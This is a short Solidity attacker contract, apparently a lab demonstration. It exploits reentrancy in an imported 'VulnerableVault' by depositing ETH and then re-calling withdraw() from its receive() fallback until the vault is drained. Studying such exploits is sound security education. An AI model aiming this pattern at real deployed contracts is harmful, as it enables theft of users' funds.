// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {VulnerableVault} from "./VulnerableVault.sol";

contract Attacker {

    VulnerableVault public vault;
    uint256 public attackAmount;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    // Start the attack
    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack");

        attackAmount = msg.value;

        // Deposit ETH into the vulnerable vault
        vault.deposit{value: msg.value}();

        // Start withdrawing
        vault.withdraw();
    }

    // Reenter the vault when receiving ETH
    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw();
        }
    }
}
